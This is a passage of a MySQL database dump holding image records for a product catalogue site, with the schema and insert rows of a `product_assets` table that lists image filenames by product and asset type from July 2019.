(261,54,'3',NULL,'3',NULL,'1562503698.jpg',1,'2019-07-07 12:48:18','2019-07-07 12:48:18',NULL,'slide'),
(262,54,'1',NULL,'1',NULL,'1562503708.jpg',1,'2019-07-07 12:48:28','2019-07-07 12:48:28',NULL,'content'),
(263,54,'2',NULL,'2',NULL,'1562503717.jpg',1,'2019-07-07 12:48:37','2019-07-07 12:48:37',NULL,'content'),
(264,54,'3',NULL,'3',NULL,'1562503728.JPG',1,'2019-07-07 12:48:48','2019-07-07 12:48:48',NULL,'content'),
(265,54,'4',NULL,'4',NULL,'1562503741.jpg',1,'2019-07-07 12:49:01','2019-07-07 12:49:01',NULL,'content'),
(266,55,'1',NULL,'1',NULL,'1562505135.jpg',1,'2019-07-07 13:12:15','2019-07-07 13:12:15',NULL,'slide'),
(267,55,'2',NULL,'2',NULL,'1562505147.jpg',1,'2019-07-07 13:12:27','2019-07-07 13:12:27',NULL,'slide'),
(268,55,'3',NULL,'3',NULL,'1562505159.jpg',1,'2019-07-07 13:12:39','2019-07-07 13:12:39',NULL,'slide'),
(269,55,'1',NULL,'1',NULL,'1562505170.jpg',1,'2019-07-07 13:12:50','2019-07-07 13:12:50',NULL,'content'),
(270,55,'2',NULL,'2',NULL,'1562505179.jpg',1,'2019-07-07 13:12:59','2019-07-07 13:12:59',NULL,'content'),
(271,55,'3',NULL,'3',NULL,'1562505188.jpg',1,'2019-07-07 13:13:08','2019-07-07 13:13:08',NULL,'content'),
(272,55,'4',NULL,'4',NULL,'1562505197.jpg',1,'2019-07-07 13:13:18','2019-07-07 13:13:18',NULL,'content'),
(273,55,'5',NULL,'5',NULL,'1562505208.jpg',1,'2019-07-07 13:13:28','2019-07-07 13:13:28',NULL,'content'),
(274,55,'6',NULL,'6',NULL,'1562505218.jpg',1,'2019-07-07 13:13:38','2019-07-07 13:13:38',NULL,'content'),
(275,55,'7',NULL,'7',NULL,'1562505228.jpg',1,'2019-07-07 13:13:48','2019-07-07 13:13:48',NULL,'content'),
(276,55,'8',NULL,'8',NULL,'1562505239.jpg',1,'2019-07-07 13:13:59','2019-07-07 13:13:59',NULL,'content'),
(277,55,'9',NULL,'9',NULL,'1562505249.jpg',1,'2019-07-07 13:14:09','2019-07-07 13:14:09',NULL,'content'),
(278,56,'1',NULL,'1',NULL,'1562509709.jpg',1,'2019-07-07 14:28:29','2019-07-07 14:28:29',NULL,'slide'),
(279,56,'2',NULL,'2',NULL,'1562509720.jpg',1,'2019-07-07 14:28:40','2019-07-07 14:28:40',NULL,'slide'),
(280,56,'3',NULL,'3',NULL,'1562509733.jpg',1,'2019-07-07 14:28:53','2019-07-07 14:28:53',NULL,'slide'),
(281,56,'1',NULL,'1',NULL,'1562509744.JPG',1,'2019-07-07 14:29:04','2019-07-07 14:29:04',NULL,'content'),
(282,56,'2',NULL,'2',NULL,'1562509754.JPG',1,'2019-07-07 14:29:14','2019-07-07 14:29:14',NULL,'content'),
(283,56,'3',NULL,'3',NULL,'1562509763.JPG',1,'2019-07-07 14:29:23','2019-07-07 14:29:23',NULL,'content'),
(284,56,'4',NULL,'4',NULL,'1562509772.JPG',1,'2019-07-07 14:29:32','2019-07-07 14:29:32',NULL,'content'),
(285,56,'5',NULL,'5',NULL,'1562509781.JPG',1,'2019-07-07 14:29:41','2019-07-07 14:29:41',NULL,'content'),
(286,56,'6',NULL,'6',NULL,'1562509790.JPG',1,'2019-07-07 14:29:50','2019-07-07 14:29:50',NULL,'content'),
(287,56,'7',NULL,'7',NULL,'1562509801.JPG',1,'2019-07-07 14:30:01','2019-07-07 14:30:01',NULL,'content'),
(288,56,'8',NULL,'8',NULL,'1562509831.jpg',1,'2019-07-07 14:30:31','2019-07-07 14:30:31',NULL,'content'),
(289,57,'1',NULL,'1',NULL,'1562510535.jpg',1,'2019-07-07 14:42:15','2019-07-07 14:42:15',NULL,'slide'),
(290,57,'2',NULL,'2',NULL,'1562510545.jpg',1,'2019-07-07 14:42:25','2019-07-07 14:42:25',NULL,'slide'),
(291,57,'3',NULL,'3',NULL,'1562510556.jpg',1,'2019-07-07 14:42:36','2019-07-07 14:42:36',NULL,'slide'),
(292,57,'1',NULL,'1',NULL,'1562510565.jpg',1,'2019-07-07 14:42:45','2019-07-07 14:42:45',NULL,'content'),
(293,57,'2',NULL,'2',NULL,'1562510574.JPG',1,'2019-07-07 14:42:54','2019-07-07 14:42:54',NULL,'content'),
(294,57,'3',NULL,'3',NULL,'1562510583.JPG',1,'2019-07-07 14:43:03','2019-07-07 14:43:03',NULL,'content'),
(295,57,'4',NULL,'4',NULL,'1562510592.jpg',1,'2019-07-07 14:43:12','2019-07-07 14:43:12',NULL,'content'),
(296,57,'5',NULL,'5',NULL,'1562510601.jpg',1,'2019-07-07 14:43:21','2019-07-07 14:43:21',NULL,'content'),
(297,58,'1',NULL,'1',NULL,'1562511291.jpg',1,'2019-07-07 14:54:51','2019-07-07 14:54:51',NULL,'slide'),
(298,58,'2',NULL,'2',NULL,'1562511302.jpg',1,'2019-07-07 14:55:02','2019-07-07 14:55:02',NULL,'slide'),
(299,58,'3',NULL,'3',NULL,'1562511313.jpg',1,'2019-07-07 14:55:13','2019-07-07 14:55:13',NULL,'slide'),
(300,58,'1',NULL,'1',NULL,'1562511324.JPG',1,'2019-07-07 14:55:24','2019-07-07 14:55:24',NULL,'content'),
(301,58,'2',NULL,'2',NULL,'1562511334.JPG',1,'2019-07-07 14:55:34','2019-07-07 14:55:34',NULL,'content'),
(304,58,'3',NULL,'3',NULL,'1562511382.JPG',1,'2019-07-07 14:56:22','2019-07-07 14:56:22',NULL,'content'),
(303,58,'4',NULL,'4',NULL,'1562511367.png',1,'2019-07-07 14:56:07','2019-07-07 14:56:07',NULL,'content'),
(305,58,'5',NULL,'5',NULL,'1562511393.JPG',1,'2019-07-07 14:56:33','2019-07-07 14:56:33',NULL,'content'),
(306,58,'6',NULL,'6',NULL,'1562511403.JPG',1,'2019-07-07 14:56:43','2019-07-07 14:56:43',NULL,'content'),
(307,58,'7',NULL,'7',NULL,'1562511412.JPG',1,'2019-07-07 14:56:52','2019-07-07 14:56:52',NULL,'content'),
(310,58,'8',NULL,'8',NULL,'1562511548.jpg',1,'2019-07-07 14:59:08','2019-07-07 14:59:08',NULL,'content'),
(309,58,'9',NULL,'9',NULL,'1562511451.jpg',1,'2019-07-07 14:57:31','2019-07-07 14:57:31',NULL,'content'),
(311,59,'1',NULL,'1',NULL,'1562512215.jpg',1,'2019-07-07 15:10:15','2019-07-07 15:10:15',NULL,'slide'),
(312,59,'2',NULL,'2',NULL,'1562512229.jpg',1,'2019-07-07 15:10:29','2019-07-07 15:10:29',NULL,'slide'),
(313,59,'3',NULL,'3',NULL,'1562512239.jpg',1,'2019-07-07 15:10:39','2019-07-07 15:10:39',NULL,'slide'),
(314,59,'1',NULL,'1',NULL,'1562512249.jpg',1,'2019-07-07 15:10:49','2019-07-07 15:10:49',NULL,'content'),
(315,59,'2',NULL,'2',NULL,'1562512258.jpg',1,'2019-07-07 15:10:58','2019-07-07 15:10:58',NULL,'content'),
(316,59,'3',NULL,'3',NULL,'1562512267.jpg',1,'2019-07-07 15:11:07','2019-07-07 15:11:07',NULL,'content'),
(317,59,'4',NULL,'4',NULL,'1562512276.jpg',1,'2019-07-07 15:11:16','2019-07-07 15:11:16',NULL,'content'),
(318,59,'5',NULL,'5',NULL,'1562512286.jpg',1,'2019-07-07 15:11:26','2019-07-07 15:11:26',NULL,'content'),
(319,59,'6',NULL,'6',NULL,'1562512297.jpg',1,'2019-07-07 15:11:37','2019-07-07 15:11:37',NULL,'content'),
(320,60,'1',NULL,'1',NULL,'1562513021.jpg',1,'2019-07-07 15:23:41','2019-07-07 15:23:41',NULL,'slide'),
(321,60,'1',NULL,'1',NULL,'1562513037.jpg',1,'2019-07-07 15:23:57','2019-07-07 15:23:57',NULL,'content'),
(322,60,'2',NULL,'2',NULL,'1562513047.jpg',1,'2019-07-07 15:24:07','2019-07-07 15:24:07',NULL,'content'),
(323,60,'3',NULL,'3',NULL,'1562513056.jpg',1,'2019-07-07 15:24:16','2019-07-07 15:24:16',NULL,'content'),
(324,60,'4',NULL,'4',NULL,'1562513065.jpg',1,'2019-07-07 15:24:25','2019-07-07 15:24:25',NULL,'content');

/*Table structure for table `product_assets` */

DROP TABLE IF EXISTS `product_assets`;

CREATE TABLE `product_assets` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) NOT NULL,
  `type` enum('model','creative_desk','videos','creative_content') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'model',
  `image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `video` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` enum('active','inactive') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'active',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `master` enum('yes','no') COLLATE utf8mb4_unicode_ci DEFAULT 'no',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=273 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `product_assets` */

insert  into `product_assets`(`id`,`product_id`,`type`,`image`,`video`,`status`,`created_at`,`updated_at`,`master`) values 
(1,1,'model','products-1563182657.jpg',NULL,'active','2019-07-15 09:24:17','2019-07-15 09:24:17','no'),
(2,7,'creative_desk','products-1563989088.jpg',NULL,'active','2019-07-24 17:24:48','2019-07-24 17:24:48','no'),
(3,10,'creative_content','products-1563989392.png',NULL,'active','2019-07-24 17:29:52','2019-07-24 17:29:52','no'),
(4,10,'model','products-1563989404.jpg',NULL,'active','2019-07-24 17:30:04','2019-07-24 17:30:04','no'),
(6,9,'model','products-1564125903.jpg',NULL,'active','2019-07-26 07:25:03','2019-07-26 07:25:03','no'),
(7,9,'model','products-1564125912.jpg',NULL,'active','2019-07-26 07:25:12','2019-07-26 07:25:12','no'),
(8,8,'model','products-1564126053.jpg',NULL,'active','2019-07-26 07:27:33','2019-07-26 07:27:33','yes'),
(9,8,'model','products-1564126062.jpg',NULL,'active','2019-07-26 07:27:42','2019-07-26 07:27:42','no'),
(11,8,'model','products-1564126078.jpg',NULL,'active','2019-07-26 07:27:58','2019-07-26 07:27:58','no'),
(12,8,'model','products-1564129537.jpg',NULL,'active','2019-07-26 08:25:37','2019-07-26 08:25:37','no'),
(13,8,'model','products-1564129545.jpg',NULL,'active','2019-07-26 08:25:45','2019-07-26 08:25:45','no'),
(14,8,'model','products-1564130116.jpg',NULL,'active','2019-07-26 08:35:16','2019-07-26 08:35:16','no'),
(15,8,'model','products-1564130127.jpg',NULL,'active','2019-07-26 08:35:27','2019-07-26 08:35:27','no'),
(16,8,'model','products-1564130137.png',NULL,'active','2019-07-26 08:35:37','2019-07-26 08:35:37','no'),
(17,14,'creative_desk','products-1564466685.jpg',NULL,'active','2019-07-30 06:04:45','2019-07-30 06:04:45','no'),
(18,14,'creative_desk','products-1564467265.jpg',NULL,'active','2019-07-30 06:14:25','2019-07-30 06:14:25','no'),
(19,14,'creative_desk','products-1564467286.jpg',NULL,'active','2019-07-30 06:14:46','2019-07-30 06:14:46','no'),
(20,14,'creative_desk','products-1564467302.jpg',NULL,'active','2019-07-30 06:15:02','2019-07-30 06:15:02','no'),
(21,14,'creative_desk','products-1564467309.jpg',NULL,'active','2019-07-30 06:15:09','2019-07-30 06:15:09','no'),
(22,14,'creative_desk','products-1564467317.jpg',NULL,'active','2019-07-30 06:15:17','2019-07-30 06:15:17','no'),
(23,14,'creative_desk','products-1564467330.jpg',NULL,'active','2019-07-30 06:15:30','2019-07-30 06:15:30','no'),
(24,14,'creative_desk','products-1564467336.jpg',NULL,'active','2019-07-30 06:15:36','2019-07-30 06:15:36','no'),
(25,14,'creative_desk','products-1564467343.jpg',NULL,'active','2019-07-30 06:15:43','2019-07-30 06:15:43','no'),
(26,14,'creative_desk','products-1564467364.jpg',NULL,'active','2019-07-30 06:16:04','2019-07-30 06:16:04','no'),
(27,13,'creative_desk','products-1564467496.jpg',NULL,'active','2019-07-30 06:18:16','2019-07-30 06:18:16','no'),
(28,13,'creative_desk','products-1564467504.jpg',NULL,'active','2019-07-30 06:18:24','2019-07-30 06:18:24','no'),
(29,13,'creative_desk','products-1564467508.jpg',NULL,'active','2019-07-30 06:18:28','2019-07-30 06:18:28','no'),
(30,13,'creative_desk','products-1564467516.jpg',NULL,'active','2019-07-30 06:18:36','2019-07-30 06:18:36','no'),
(31,13,'creative_desk','products-1564467522.jpg',NULL,'active','2019-07-30 06:18:42','2019-07-30 06:18:42','no'),
(32,13,'creative_desk','products-1564467531.jpg',NULL,'active','2019-07-30 06:18:51','2019-07-30 06:18:51','no'),
(33,13,'creative_desk','products-1564467546.jpg',NULL,'active','2019-07-30 06:19:06','2019-07-30 06:19:06','no'),
(34,13,'creative_desk','products-1564467555.jpg',NULL,'active','2019-07-30 06:19:15','2019-07-30 06:19:15','no'),
(35,13,'model','products-1564467561.jpg',NULL,'active','2019-07-30 06:19:21','2019-07-30 06:19:21','no'),
(36,13,'model','products-1564467572.jpg',NULL,'active','2019-07-30 06:19:32','2019-07-30 06:19:32','no'),
(37,13,'model','products-1564467584.jpg',NULL,'active','2019-07-30 06:19:44','2019-07-30 06:19:44','no'),
(38,12,'model','products-1564468628.JPG',NULL,'active','2019-07-30 06:37:08','2019-07-30 06:37:08','no'),
(39,12,'creative_desk','products-1564468648.JPG',NULL,'active','2019-07-30 06:37:28','2019-07-30 06:37:28','no'),
(40,12,'creative_content','products-1564468654.JPG',NULL,'active','2019-07-30 06:37:34','2019-07-30 06:37:34','no'),
(41,12,'creative_desk','products-1564468664.JPG',NULL,'active','2019-07-30 06:37:44','2019-07-30 06:37:44','no'),
(42,12,'creative_content','products-1564468671.JPG',NULL,'active','2019-07-30 06:37:51','2019-07-30 06:37:51','no'),
(43,12,'creative_content','products-1564468679.JPG',NULL,'active','2019-07-30 06:37:59','2019-07-30 06:37:59','no'),
(44,12,'creative_content','products-1564468688.JPG',NULL,'active','2019-07-30 06:38:08','2019-07-30 06:38:08','no'),
(45,12,'creative_content','products-1564468694.JPG',NULL,'active','2019-07-30 06:38:14','2019-07-30 06:38:14','no'),
(46,12,'creative_content','products-1564468714.JPG',NULL,'active','2019-07-30 06:38:34','2019-07-30 06:38:34','no'),
(47,11,'creative_content','products-1564468747.JPG',NULL,'active','2019-07-30 06:39:07','2019-07-30 06:39:07','no'),
(48,11,'creative_content','products-1564468754.jpg',NULL,'active','2019-07-30 06:39:14','2019-07-30 06:39:14','no'),
(49,11,'creative_content','products-1564468760.jpg',NULL,'active','2019-07-30 06:39:20','2019-07-30 06:39:20','no'),
(50,11,'creative_content','products-1564468768.JPG',NULL,'active','2019-07-30 06:39:28','2019-07-30 06:39:28','no'),
(51,11,'creative_content','products-1564468774.JPG',NULL,'active','2019-07-30 06:39:34','2019-07-30 06:39:34','no'),
(52,11,'creative_content','products-1564468781.JPG',NULL,'active','2019-07-30 06:39:41','2019-07-30 06:39:41','no'),
(53,11,'creative_content','products-1564468791.JPG',NULL,'active','2019-07-30 06:39:51','2019-07-30 06:39:51','no'),
(54,11,'creative_content','products-1564468797.JPG',NULL,'active','2019-07-30 06:39:57','2019-07-30 06:39:57','no'),
(55,11,'creative_content','products-1564468805.jpg',NULL,'active','2019-07-30 06:40:05','2019-07-30 06:40:05','no'),
(56,11,'creative_content','products-1564468812.JPG',NULL,'active','2019-07-30 06:40:12','2019-07-30 06:40:12','no'),
(57,11,'creative_content','products-1564468818.JPG',NULL,'active','2019-07-30 06:40:18','2019-07-30 06:40:18','no'),
(58,11,'model','products-1564468840.jpg',NULL,'active','2019-07-30 06:40:40','2019-07-30 06:40:40','no'),
(59,11,'model','products-1564468848.jpg',NULL,'active','2019-07-30 06:40:48','2019-07-30 06:40:48','no'),
(60,11,'model','products-1564468858.jpg',NULL,'active','2019-07-30 06:40:58','2019-07-30 06:40:58','no'),
(61,11,'model','products-1564468867.JPG',NULL,'active','2019-07-30 06:41:07','2019-07-30 06:41:07','no'),
(62,15,'model','products-1564469144.jpg',NULL,'active','2019-07-30 06:45:44','2019-07-30 06:45:44','no'),
(63,15,'model','products-1564469152.jpg',NULL,'active','2019-07-30 06:45:52','2019-07-30 06:45:52','no'),
(64,15,'creative_content','products-1564469168.jpg',NULL,'active','2019-07-30 06:46:08','2019-07-30 06:46:08','no'),
(65,15,'creative_content','products-1564469176.jpg',NULL,'active','2019-07-30 06:46:16','2019-07-30 06:46:16','no'),
(66,15,'creative_content','products-1564469190.jpg',NULL,'active','2019-07-30 06:46:30','2019-07-30 06:46:30','no'),
(67,15,'creative_content','products-1564469198.jpg',NULL,'active','2019-07-30 06:46:38','2019-07-30 06:46:38','no'),
(68,15,'creative_content','products-1564469205.jpg',NULL,'active','2019-07-30 06:46:46','2019-07-30 06:46:46','no'),
(69,15,'creative_content','products-1564469215.jpg',NULL,'active','2019-07-30 06:46:55','2019-07-30 06:46:55','no'),
(70,15,'creative_content','products-1564469224.jpg',NULL,'active','2019-07-30 06:47:04','2019-07-30 06:47:04','no'),
(71,15,'creative_content','products-1564469233.jpg',NULL,'active','2019-07-30 06:47:13','2019-07-30 06:47:13','no'),
(72,16,'model','products-1564469393.jpg',NULL,'active','2019-07-30 06:49:53','2019-07-30 06:49:53','no'),
(73,16,'model','products-1564469399.jpg',NULL,'active','2019-07-30 06:49:59','2019-07-30 06:49:59','no'),
(74,16,'model','products-1564469405.jpg',NULL,'active','2019-07-30 06:50:05','2019-07-30 06:50:05','no'),
(75,16,'model','products-1564469412.jpg',NULL,'active','2019-07-30 06:50:12','2019-07-30 06:50:12','no'),
(76,16,'model','products-1564469420.jpg',NULL,'active','2019-07-30 06:50:20','2019-07-30 06:50:20','no'),
(77,16,'creative_content','products-1564469429.jpg',NULL,'active','2019-07-30 06:50:29','2019-07-30 06:50:29','no'),
(78,16,'creative_content','products-1564469435.jpg',NULL,'active','2019-07-30 06:50:35','2019-07-30 06:50:35','no'),
(79,16,'creative_content','products-1564469441.jpg',NULL,'active','2019-07-30 06:50:41','2019-07-30 06:50:41','no'),
(80,16,'creative_content','products-1564469448.jpg',NULL,'active','2019-07-30 06:50:48','2019-07-30 06:50:48','no'),
(81,16,'creative_content','products-1564469492.jpg',NULL,'active','2019-07-30 06:51:32','2019-07-30 06:51:32','no'),
(82,16,'creative_content','products-1564469499.jpg',NULL,'active','2019-07-30 06:51:39','2019-07-30 06:51:39','no'),
(83,16,'creative_content','products-1564469509.jpg',NULL,'active','2019-07-30 06:51:49','2019-07-30 06:51:49','no'),
(84,16,'creative_content','products-1564469528.jpg',NULL,'active','2019-07-30 06:52:08','2019-07-30 06:52:08','no'),
(85,16,'creative_content','products-1564469538.jpg',NULL,'active','2019-07-30 06:52:18','2019-07-30 06:52:18','no'),
(86,16,'creative_content','products-1564469570.jpg',NULL,'active','2019-07-30 06:52:50','2019-07-30 06:52:50','no'),
(87,17,'model','products-1564469877.jpg',NULL,'active','2019-07-30 06:57:57','2019-07-30 06:57:57','no'),
(88,17,'creative_content','products-1564469891.jpg',NULL,'active','2019-07-30 06:58:11','2019-07-30 06:58:11','no'),
(89,17,'creative_content','products-1564469898.jpg',NULL,'active','2019-07-30 06:58:18','2019-07-30 06:58:18','no'),
(90,17,'creative_content','products-1564469905.jpg',NULL,'active','2019-07-30 06:58:25','2019-07-30 06:58:25','no'),
(91,17,'creative_content','products-1564469930.jpg',NULL,'active','2019-07-30 06:58:50','2019-07-30 06:58:50','no'),
(92,17,'creative_content','products-1564469936.jpg',NULL,'active','2019-07-30 06:58:56','2019-07-30 06:58:56','no'),
(93,17,'creative_content','products-1564469941.jpg',NULL,'active','2019-07-30 06:59:01','2019-07-30 06:59:01','no'),
(94,17,'creative_content','products-1564469947.jpg',NULL,'active','2019-07-30 06:59:07','2019-07-30 06:59:07','no'),
(95,17,'creative_content','products-1564469957.jpg',NULL,'active','2019-07-30 06:59:17','2019-07-30 06:59:17','no'),
(96,17,'creative_content','products-1564469969.jpg',NULL,'active','2019-07-30 06:59:29','2019-07-30 06:59:29','no'),
(97,17,'creative_content','products-1564469977.jpg',NULL,'active','2019-07-30 06:59:37','2019-07-30 06:59:37','no'),
(98,17,'creative_content','products-1564469983.jpg',NULL,'active','2019-07-30 06:59:43','2019-07-30 06:59:43','no'),
(99,18,'model','products-1564470758.JPG',NULL,'active','2019-07-30 07:12:38','2019-07-30 07:12:38','no'),
(100,18,'creative_content','products-1564470777.JPG',NULL,'active','2019-07-30 07:12:57','2019-07-30 07:12:57','no'),
(101,18,'creative_content','products-1564470783.JPG',NULL,'active','2019-07-30 07:13:03','2019-07-30 07:13:03','no'),
(102,18,'creative_content','products-1564470799.jpg',NULL,'active','2019-07-30 07:13:19','2019-07-30 07:13:19','no'),
(103,18,'creative_content','products-1564470834.JPG',NULL,'active','2019-07-30 07:13:54','2019-07-30 07:13:54','no'),
(104,18,'creative_content','products-1564470841.JPG',NULL,'active','2019-07-30 07:14:01','2019-07-30 07:14:01','no'),
(105,18,'creative_content','products-1564470848.JPG',NULL,'active','2019-07-30 07:14:08','2019-07-30 07:14:08','no'),
(106,18,'creative_content','products-1564470857.JPG',NULL,'active','2019-07-30 07:14:17','2019-07-30 07:14:17','no'),
(107,19,'model','products-1564471277.jpg',NULL,'active','2019-07-30 07:21:17','2019-07-30 07:21:17','no'),
(108,19,'model','products-1564471293.jpg',NULL,'active','2019-07-30 07:21:33','2019-07-30 07:21:33','no'),
(109,19,'model','products-1564471301.jpg',NULL,'active','2019-07-30 07:21:41','2019-07-30 07:21:41','no'),
(110,19,'creative_content','products-1564471314.jpg',NULL,'active','2019-07-30 07:21:54','2019-07-30 07:21:54','no'),
(111,19,'creative_content','products-1564471323.jpg',NULL,'active','2019-07-30 07:22:03','2019-07-30 07:22:03','no'),
(112,19,'creative_content','products-1564471332.jpg',NULL,'active','2019-07-30 07:22:12','2019-07-30 07:22:12','no'),
(113,19,'creative_content','products-1564471339.jpg',NULL,'active','2019-07-30 07:22:19','2019-07-30 07:22:19','no'),
(114,19,'creative_content','products-1564471344.jpg',NULL,'active','2019-07-30 07:22:24','2019-07-30 07:22:24','no'),
(115,19,'creative_content','products-1564471350.jpg',NULL,'active','2019-07-30 07:22:30','2019-07-30 07:22:30','no'),
(116,20,'model','products-1564472689.JPG',NULL,'active','2019-07-30 07:44:49','2019-07-30 07:44:49','no'),
(117,20,'model','products-1564472702.JPG',NULL,'active','2019-07-30 07:45:02','2019-07-30 07:45:02','no'),
(118,20,'creative_content','products-1564472723.JPG',NULL,'active','2019-07-30 07:45:23','2019-07-30 07:45:23','no'),
(119,20,'creative_content','products-1564472730.jpg',NULL,'active','2019-07-30 07:45:30','2019-07-30 07:45:30','no'),
(120,20,'creative_content','products-1564472735.jpg',NULL,'active','2019-07-30 07:45:35','2019-07-30 07:45:35','no'),
(121,20,'creative_content','products-1564472741.jpg',NULL,'active','2019-07-30 07:45:41','2019-07-30 07:45:41','no'),
(122,20,'creative_content','products-1564472747.jpg',NULL,'active','2019-07-30 07:45:47','2019-07-30 07:45:47','no'),
(123,20,'creative_content','products-1564472756.JPG',NULL,'active','2019-07-30 07:45:56','2019-07-30 07:45:56','no'),
(124,20,'creative_content','products-1564472764.JPG',NULL,'active','2019-07-30 07:46:04','2019-07-30 07:46:04','no'),
(125,20,'creative_content','products-1564472779.JPG',NULL,'active','2019-07-30 07:46:19','2019-07-30 07:46:19','no'),
(126,21,'model','products-1564472919.jpg',NULL,'active','2019-07-30 07:48:39','2019-07-30 07:48:39','no'),
(127,21,'creative_content','products-1564472926.JPG',NULL,'active','2019-07-30 07:48:46','2019-07-30 07:48:46','no'),
(128,21,'creative_content','products-1564472932.JPG',NULL,'active','2019-07-30 07:48:53','2019-07-30 07:48:53','no'),
(129,21,'creative_content','products-1564472939.JPG',NULL,'active','2019-07-30 07:48:59','2019-07-30 07:48:59','no'),
(130,21,'creative_content','products-1564472945.jpg',NULL,'active','2019-07-30 07:49:05','2019-07-30 07:49:05','no'),
(131,21,'creative_content','products-1564472949.jpg',NULL,'active','2019-07-30 07:49:09','2019-07-30 07:49:09','no'),
(132,21,'creative_content','products-1564472954.JPG',NULL,'active','2019-07-30 07:49:14','2019-07-30 07:49:14','no'),
(133,21,'creative_content','products-1564472959.JPG',NULL,'active','2019-07-30 07:49:19','2019-07-30 07:49:19','no'),
(134,22,'model','',NULL,'active','2019-07-30 08:10:15','2019-07-30 08:10:15','no'),
(135,22,'model','products-1564474222.JPG',NULL,'active','2019-07-30 08:10:22','2019-07-30 08:10:22','no'),
(136,22,'model','products-1564474231.jpg',NULL,'active','2019-07-30 08:10:31','2019-07-30 08:10:31','no'),
(137,22,'model','products-1564474241.jpg',NULL,'active','2019-07-30 08:10:41','2019-07-30 08:10:41','no'),
(138,22,'creative_content','products-1564474247.JPG',NULL,'active','2019-07-30 08:10:47','2019-07-30 08:10:47','no'),
(139,22,'creative_content','products-1564474252.JPG',NULL,'active','2019-07-30 08:10:52','2019-07-30 08:10:52','no'),
(140,22,'creative_content','products-1564474257.JPG',NULL,'active','2019-07-30 08:10:57','2019-07-30 08:10:57','no'),
(141,22,'creative_content','products-1564474263.JPG',NULL,'active','2019-07-30 08:11:03','2019-07-30 08:11:03','no'),
(142,22,'creative_content','products-1564474273.jpg',NULL,'active','2019-07-30 08:11:13','2019-07-30 08:11:13','no'),
(143,22,'creative_content','products-1564474278.jpg',NULL,'active','2019-07-30 08:11:18','2019-07-30 08:11:18','no'),
(144,22,'creative_content','products-1564474283.jpg',NULL,'active','2019-07-30 08:11:23','2019-07-30 08:11:23','no'),
(145,22,'creative_content','products-1564474288.jpg',NULL,'active','2019-07-30 08:11:28','2019-07-30 08:11:28','no'),
(146,22,'creative_content','products-1564474298.JPG',NULL,'active','2019-07-30 08:11:38','2019-07-30 08:11:38','no'),
(147,22,'creative_content','products-1564474303.JPG',NULL,'active','2019-07-30 08:11:43','2019-07-30 08:11:43','no'),
(148,22,'creative_content','products-1564474312.JPG',NULL,'active','2019-07-30 08:11:52','2019-07-30 08:11:52','no'),
(149,23,'model','products-1564474491.webp',NULL,'active','2019-07-30 08:14:51','2019-07-30 08:14:51','no'),
(150,23,'model','products-1564474497.webp',NULL,'active','2019-07-30 08:14:57','2019-07-30 08:14:57','no'),
(151,23,'model','products-1564474503.webp',NULL,'active','2019-07-30 08:15:03','2019-07-30 08:15:03','no'),
(152,23,'model','products-1564474508.JPG',NULL,'active','2019-07-30 08:15:08','2019-07-30 08:15:08','no'),
(153,23,'model','products-1564474514.JPG',NULL,'active','2019-07-30 08:15:14','2019-07-30 08:15:14','no'),
(154,23,'creative_content','products-1564474520.webp',NULL,'active','2019-07-30 08:15:20','2019-07-30 08:15:20','no'),
(155,23,'creative_content','products-1564474527.JPG',NULL,'active','2019-07-30 08:15:27','2019-07-30 08:15:27','no'),
(156,23,'creative_content','products-1564474538.jpg',NULL,'active','2019-07-30 08:15:38','2019-07-30 08:15:38','no'),
(157,24,'model','products-1564493421.jpg',NULL,'active','2019-07-30 13:30:21','2019-07-30 13:30:21','no'),
(158,24,'model','products-1564493427.jpg',NULL,'active','2019-07-30 13:30:27','2019-07-30 13:30:27','no'),
(159,24,'model','products-1564493434.jpg',NULL,'active','2019-07-30 13:30:34','2019-07-30 13:30:34','no'),
(160,24,'model','products-1564493439.jpg',NULL,'active','2019-07-30 13:30:39','2019-07-30 13:30:39','no'),
(161,24,'creative_content','products-1564493446.JPG',NULL,'active','2019-07-30 13:30:46','2019-07-30 13:30:46','no'),
(162,24,'creative_content','products-1564493458.jpg',NULL,'active','2019-07-30 13:30:58','2019-07-30 13:30:58','no'),
(163,25,'creative_content','products-1564493594.JPG',NULL,'active','2019-07-30 13:33:14','2019-07-30 13:33:14','no'),
(164,25,'creative_content','products-1564493595.JPG',NULL,'active','2019-07-30 13:33:15','2019-07-30 13:33:15','no'),
(165,25,'creative_content','products-1564493601.jpg',NULL,'active','2019-07-30 13:33:21','2019-07-30 13:33:21','no'),
(166,25,'creative_content','products-1564493607.jpg',NULL,'active','2019-07-30 13:33:27','2019-07-30 13:33:27','no'),
(167,25,'creative_content','products-1564493612.jpg',NULL,'active','2019-07-30 13:33:32','2019-07-30 13:33:32','no'),
(168,26,'creative_content','products-1564493739.JPG',NULL,'active','2019-07-30 13:35:39','2019-07-30 13:35:39','no'),
(169,26,'creative_content','products-1564493746.jpg',NULL,'active','2019-07-30 13:35:46','2019-07-30 13:35:46','no'),
(170,27,'model','products-1564493882.jpg',NULL,'active','2019-07-30 13:38:02','2019-07-30 13:38:02','no'),
(171,27,'model','products-1564493887.jpg',NULL,'active','2019-07-30 13:38:07','2019-07-30 13:38:07','no'),
(172,27,'model','products-1564493893.jpg',NULL,'active','2019-07-30 13:38:13','2019-07-30 13:38:13','no'),
(173,27,'model','products-1564493899.jpg',NULL,'active','2019-07-30 13:38:19','2019-07-30 13:38:19','no'),
(174,28,'creative_desk','products-1564494012.JPG',NULL,'active','2019-07-30 13:40:12','2019-07-30 13:40:12','no'),
(175,29,'model','products-1564494138.jpg',NULL,'active','2019-07-30 13:42:18','2019-07-30 13:42:18','no'),
(176,29,'model','products-1564494146.jpg',NULL,'active','2019-07-30 13:42:26','2019-07-30 13:42:26','no'),
(177,29,'creative_content','products-1564494152.jpg',NULL,'active','2019-07-30 13:42:32','2019-07-30 13:42:32','no'),
(178,29,'creative_content','products-1564494158.jpg',NULL,'active','2019-07-30 13:42:38','2019-07-30 13:42:38','no'),
(179,29,'creative_content','products-1564494168.jpg',NULL,'active','2019-07-30 13:42:48','2019-07-30 13:42:48','no'),
